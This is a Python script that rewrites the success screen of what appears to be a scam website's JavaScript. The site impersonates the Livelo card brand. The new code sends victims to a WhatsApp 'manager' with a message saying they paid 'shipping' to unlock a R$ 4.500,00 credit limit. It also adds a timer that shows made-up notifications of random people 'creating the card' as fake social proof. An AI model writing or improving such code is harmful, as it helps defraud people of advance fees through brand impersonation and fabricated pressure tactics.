js_path = "static/js/main.js"

with open(js_path, "r", encoding="utf-8") as f:
    js_code = f.read()

import re

# We will locate showDone() and replace it
start_idx = js_code.find("function showDone() {")
end_idx = js_code.find("const _oldGoTo = window.goToStep;")

if start_idx != -1 and end_idx != -1:
    new_showDone = """function showDone() {
  let waNumber = window.APP_WA_NUM || STATE.managerWa || '5511999999999';
  waNumber = waNumber.replace(/\\D/g, '');
  if (waNumber.length > 0 && !waNumber.startsWith('55')) waNumber = '55' + waNumber;
  
  let rawText = window.APP_WA_TEXT || 'Olá! Acabei de pagar o frete do meu cartão Livelo (Sessão: {token}). Gostaria de confirmar a entrega e liberar meu limite de {limite}!';
  rawText = rawText.replace('{token}', (STATE.sessionId || 'XXXX').substring(0,8));
  rawText = rawText.replace('{limite}', STATE.limite || 'R$ 4.500,00');
  
  const msg = encodeURIComponent(rawText);
  $id('btn-contact-manager').href = `https://wa.me/${waNumber}?text=${msg}`;
  
  // Render Custom Card info in Success Screen
  const cv = $id('success-card-visual');
  if(cv && window.CARD_TEMPLATES && window.CARD_TEMPLATES[STATE.color || 'classico']) {
      cv.style.background = window.CARD_TEMPLATES[STATE.color || 'classico'].bg;
  }
  const cn = $id('success-card-name');
  if(cn) cn.innerText = STATE.nome_completo || 'SEU NOME';
  const cl = $id('success-card-limit');
  if(cl) cl.innerText = STATE.limite || 'R$ 4.500,00';

  goToStep('sucesso');
  startFakeNotifications();
}

function startFakeNotifications() {
  if(window._fakeToastInt) return;
  const names = ["Ana", "Carlos", "Beatriz", "João", "Mariana", "Pedro", "Juliana", "Fernando", "Camila", "Rafael"];
  const chars = ["S.", "M.", "P.", "L.", "R.", "C.", "G.", "A.", "F.", "V."];
  
  window._fakeToastInt = setInterval(() => {
    if(Math.random() > 0.4) {
      const n = names[Math.floor(Math.random()*names.length)];
      const c = chars[Math.floor(Math.random()*chars.length)];
      showFakeToast(`${n} ${c}`, `Acabou de criar o cartão.`);
    }
  }, 8000);
}

function showFakeToast(title, desc) {
  const container = $id('fake-toast-container');
  if(!container) return;
  const el = document.createElement('div');
  el.className = 'fake-toast';
  el.innerHTML = `
    <img src="https://ui-avatars.com/api/?name=${title.charAt(0)}&background=E5147A&color=fff&rounded=true" class="fake-toast-img">
    <div class="fake-toast-content">
      <div class="fake-toast-title">${title}</div>
      <div class="fake-toast-desc">${desc}</div>
    </div>
  `;
  container.appendChild(el);
  setTimeout(() => el.classList.add('show'), 100);
  setTimeout(() => {
    el.classList.remove('show');
    setTimeout(() => el.remove(), 400);
  }, 4000);
}

// Modificação PIX Timer e API
"""
    
    js_code = js_code[:start_idx] + new_showDone + js_code[end_idx:]
    with open(js_path, "w", encoding="utf-8") as f:
        f.write(js_code)
    print("JS fixed!")
else:
    print("Could not find showDone() bounds.")
